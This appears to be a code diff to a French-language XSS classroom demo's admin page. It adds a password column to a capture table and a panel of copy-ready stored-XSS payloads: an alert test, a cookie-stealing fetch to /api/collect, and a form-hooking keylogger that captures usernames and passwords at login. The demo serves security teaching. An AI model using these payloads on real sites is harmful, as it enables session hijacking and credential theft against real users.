@@ -129,6 +129,7 @@
                   <th>Type</th>
                   <th>DemoToken</th>
                   <th>Utilisateur</th>
+                  <th>&#128274; Mot de passe</th>
                   <th>Chapitre</th>
                 </tr>
               </thead>
@@ -145,6 +146,13 @@
                     </td>
                     <td><code><%= capture.demoToken %></code></td>
                     <td><strong><%= capture.userName || 'Unknown' %></strong></td>
+                    <td>
+                      <% if (capture.password) { %>
+                        <code class="text-danger"><strong><%= capture.password %></strong></code>
+                      <% } else { %>
+                        <span class="text-muted">—</span>
+                      <% } %>
+                    </td>
                     <td><%= capture.chapterId || 'N/A' %></td>
                   </tr>
                 <% }) %>
@@ -158,24 +166,60 @@
     <!-- Aide rapide -->
     <div class="card">
       <div class="card-header">
-        <h4>&#128161; Aide rapide</h4>
+        <h4>&#128161; Aide rapide &mdash; Payloads prets a l'emploi</h4>
       </div>
       <div class="card-body">
-        <div class="grid grid-2 gap-lg">
-          <div>
-            <h5 class="mb-sm">Tester un payload XSS</h5>
-            <p class="text-sm text-secondary">Copiez ce payload dans un commentaire global :</p>
-            <div class="code-block">
-              <pre><code>&lt;img src="x" onerror="alert('XSS Demo')"&gt;</code></pre>
+        <p class="text-sm text-secondary mb-lg">Cliquez sur <strong>Copier</strong> puis collez le payload dans un <strong>Commentaire global</strong> ci-dessus pour le diffuser sur tous les chapitres.</p>
+        <div class="grid grid-1 gap-lg">
+
+          <!-- Payload 1 : alert -->
+          <div class="card">
+            <div class="card-body">
+              <div class="flex justify-between items-center mb-sm">
+                <h5 class="mb-0">&#128680; Tester un payload XSS (alert)</h5>
+                <button class="btn btn-sm" onclick="copyPayload('payload-alert')">&#128203; Copier</button>
+              </div>
+              <p class="text-sm text-secondary mb-sm">Declenche une alerte dans le navigateur de chaque visiteur.</p>
+              <div class="code-block">
+                <pre><code id="payload-alert">&lt;img src="x" onerror="alert('XSS Demo — vous etes vulnerables !')"&gt;</code></pre>
+              </div>
             </div>
           </div>
-          <div>
-            <h5 class="mb-sm">Simuler une exfiltration</h5>
-            <p class="text-sm text-secondary">Ce payload envoie le demoToken au serveur :</p>
-            <div class="code-block">
-              <pre><code>&lt;img src="x" onerror="fetch('/api/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoToken:document.cookie.match(/demoToken=([^;]+)/)?.[1],userName:'test'})})"&gt;</code></pre>
+
+          <!-- Payload 2 : exfiltration cookie -->
+          <div class="card">
+            <div class="card-body">
+              <div class="flex justify-between items-center mb-sm">
+                <h5 class="mb-0">&#127919; Exfiltration de cookie (demoToken)</h5>
+                <button class="btn btn-sm btn-warning" onclick="copyPayload('payload-cookie')">&#128203; Copier</button>
+              </div>
+              <p class="text-sm text-secondary mb-sm">Vol du cookie de session et envoi au serveur. Resultat visible dans la colonne <strong>DemoToken</strong> ci-dessus.</p>
+              <div class="code-block">
+                <pre><code id="payload-cookie">&lt;img src=x onerror="fetch('/api/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoToken:document.cookie.match(/demoToken=([^;]+)/)?.[1]||'NO_TOKEN',userName:document.cookie.match(/userName=([^;]+)/)?.[1]||'Unknown',captureType:'cookie'})})"&gt;</code></pre>
+              </div>
             </div>
           </div>
+
+          <!-- Payload 3 : keylogger de formulaire -->
+          <div class="card card-danger">
+            <div class="card-body">
+              <div class="flex justify-between items-center mb-sm">
+                <h5 class="mb-0 text-danger">&#128274; Vol de mot de passe (keylogger formulaire)</h5>
+                <button class="btn btn-sm btn-danger" onclick="copyPayload('payload-creds')">&#128203; Copier</button>
+              </div>
+              <p class="text-sm text-secondary mb-sm">S'accroche sur tous les formulaires de la page. Quand un eleve poste un commentaire, son nom + contenu sont captures. Resultat visible dans la colonne <strong>Mot de passe</strong>.</p>
+              <div class="alert alert-warning mb-sm">
+                <span class="alert-icon">&#128161;</span>
+                <div class="alert-content">
+                  <p class="alert-message">Pour voir un mot de passe : injectez ce payload, puis <strong>deconnectez-vous</strong> et reconnectez-vous. Le payload capturera les identifiants saisis au login.</p>
+                </div>
+              </div>
+              <div class="code-block">
+                <pre><code id="payload-creds">&lt;img src=x onerror="document.querySelectorAll('form').forEach(f=&gt;{f.addEventListener('submit',function(){var u=f.querySelector('[name=username],[name=content]');var p=f.querySelector('[type=password]');fetch('/api/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoToken:document.cookie.match(/demoToken=([^;]+)/)?.[1]||'NO_TOKEN',userName:u?u.value:'UNKNOWN',password:p?p.value:'(pas de champ password)',captureType:'form'})})})})"&gt;</code></pre>
+              </div>
+            </div>
+          </div>
+
         </div>
       </div>
     </div>
@@ -240,6 +284,13 @@
     // Demarrer
     startAutoRefresh();
     window.addEventListener('beforeunload', stopAutoRefresh);
+
+    function copyPayload(elementId) {
+      const el = document.getElementById(elementId);
+      navigator.clipboard.writeText(el.textContent).then(() => {
+        ToastManager.success('Payload copie ! Collez-le dans un commentaire global.', 3000);
+      });
+    }
   </script>
 </body>
 </html>
